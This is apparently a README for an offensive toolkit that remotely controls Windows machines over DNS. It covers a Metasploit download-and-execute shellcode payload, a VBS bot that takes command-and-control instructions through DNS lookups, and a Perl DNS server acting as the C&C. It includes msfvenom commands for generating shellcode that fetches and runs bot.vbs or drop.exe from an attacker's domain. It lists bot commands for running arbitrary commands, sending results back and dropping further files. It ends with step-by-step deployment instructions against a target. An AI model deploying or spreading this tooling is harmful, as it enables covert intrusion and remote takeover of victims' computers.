# Reverse DNS payloads for Remote control
Reverse DNS payload for Metasploit: Download  Exec x86 shellcode. Also DNS Handler and VBS bot (working over DNS) as PoC included.

## Components

### dns_download_exec_svchost.rb

Metasploit payload: X86 download and exec via reverse DNS channel. Jut put this file into msf3 payload folder and then you could use it like that:

     mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le | sed -s 's/\%/\\/g'

DOMAIN - domain you should control (NS).

EXT - file extension

This payload are using getaddrinfo API function for getting data over DNS (to %temp% dir). This shellcode will work even on boxes without IPv6 assigned (my previos one - https://www.exploit-db.com/exploits/17326/ required IPv6 address asssigned, so in this, new version we do not need it!). 
In this new version resolved IPv6 addresses will be from reserved block. This shellcode uses IPv6 in ranges from ff00:: to ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

those IPv6 will be resolve even if no IPv6 address assigned to the interface (only linked). First byte should be ff, than second is control byte that tell us what block of data we have and flag "last block". All last 14 bytes of IPv6 - data as is (no encoding needed, like in TXT section). For one DNS response we could receive up to 17 IP addresses, so for one DNS request we could get 238 bytes of raw data.
 
 aaaa.a.dom.ws - first 238 bytes
 baaa.a.dom.ws - second 238 bytes
 caaa.a.dom.ws - ....
 ....
 abaa.a.dom.ws - ...
 cbaa.a.dom.ws - for example last peace of data (in this case we have flag of last pice in first 4 bits of second byte)
 
 Maximum size: up to 88 Mb (zzzz.dom.ws)
 Download Speed: ~ 4 Kb/sec
 Shellcode size: 833 bytes (no null bytes by default)
 
### bot.vbs
 
 PoC of agent on VBS that could use reverse DNS channel for recieveing commands. This prototype uses nslookup for resolving ipv4 addresses.
 As first action this agent will  try to register on C&C by using AD domain/workgroup name and current login, after that it will frequently requesting DNS  for getting commands to execute. If command will be received then result of execution will be sent back in base64 format. 
 
#### Commands
    exit                   - kill process with agent (wscript)
    sleep                  - sleep 30 seconds until next request
    download [part] [file] - download another file [part] - subdomain with file
                                                   [file] - local file name (to create)
                             Download speed here ~ 1 Kb/Sec
                             example: download b drop.exe
                             (will be converted into aaaa.b.dom.ws, baaa.b.dom.ws)
    [any other command]    - will run cmd /c [any other command]

    
This is juts PoC and prototype so we do not have here autorun and hiding features!

### revdns.pl

DNS handler that should be used as dom.ws name server. Works as agent C&C server and could support sessions (if we have more than one agent)
 and also contains egg-drop for shellode/or bot.vbs (up to 88Mb). Support both: bot.vbs and DNS shellcode. And it is designed to work as combo:
  
 1. Shellcode using this DNS downloading bot.vs and run it
 2. bot.vs using same DNS as C&C and could download next file (see revdns.pl)

P.S. This perl code based on my old ugly-coded-perl DNS server, so sorry for that 8)

Original(and old) preso about this project is here: [https://erpscan.com/wp-content/uploads/2012/06/dns-for-evil.pdf](CONFidence 2011 slides: DNS for EVIL)

## Example usage

1) Buy a domain name and host a revdns.pl. Let's say we have zlo.ws and host 11.11.11.11 (as our C&C server)

2) Configure revdns.pl (on 11.11.11.11) 

    @EGGs = ("bot.vbs","drop.exe")
    
So now it "stores" two drop files in a.zlo.ws and in b.zlo.ws

3) Configure revdns.pl 
  
        $DOMAIN = "zlo.ws";               
        $IPA = "11.11.11.11"; 

4) Configure bot.vbs (on 11.11.11.11)

        DOMAIN="zlo.ws" 
        
5) Put drop.exe (on 11.11.11.11) as any binary (better small 8))              
              
6) Run revdns.pl

7) Setup NS for zlo.ws to 11.11.11.11

8) Now we a read, let's generate shellocode

If you want shellcode download and exec bot.vbs
 
        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=a.0x41.ws EXT=vbs -f js_le
        
If you want shellcode download and exec drop.exe
 
        mssfvenom -p windows/dns_download_exec_svchost DOMAIN=b.0x41.ws EXT=exe -f js_le
        
9) Run exploit with shellocde on target box, and then (if bot.vbs used) wait when BOT from the box will be connected to revdns.pl

10) Use interactive or auto mode of revdns.pl
